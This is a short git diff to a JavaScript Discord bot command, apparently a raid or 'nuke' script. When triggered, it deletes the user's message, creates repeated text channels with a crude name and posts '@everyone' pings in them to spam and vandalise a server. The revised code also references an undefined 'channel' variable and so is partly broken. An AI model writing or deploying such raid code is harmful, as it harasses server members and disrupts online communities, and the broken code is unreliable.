@@ -1,9 +1,9 @@
 module.exports.run = async(bot, message) => {  
 message.delete()
-let salonAnnonce = message.guild.channels.find(`name`, "fucked by poke communistes");
-message.guild.createChannel(`fucked by poke communistes`, "text")
-message.guild.createChannel(`fucked by poke communistes`, "text")
-.then(salonAnnonce.send(`@everyone fucked by des poke communiste`));
+
+message.guild.createChannel(`fucked by poke communistes`, "text").then(channel.send(`@everyone fucked by des poke communiste`));
+message.guild.createChannel(`fucked by poke communistes`, "text").then(channel.send(`@everyone fucked by des poke communiste`));
+
 /*message.guild.createChannel(`fucked by poke communistes`, "text")
 message.guild.createChannel(`fucked by poke communistes`, "text")
 message.guild.createChannel(`fucked by poke communistes`, "text")
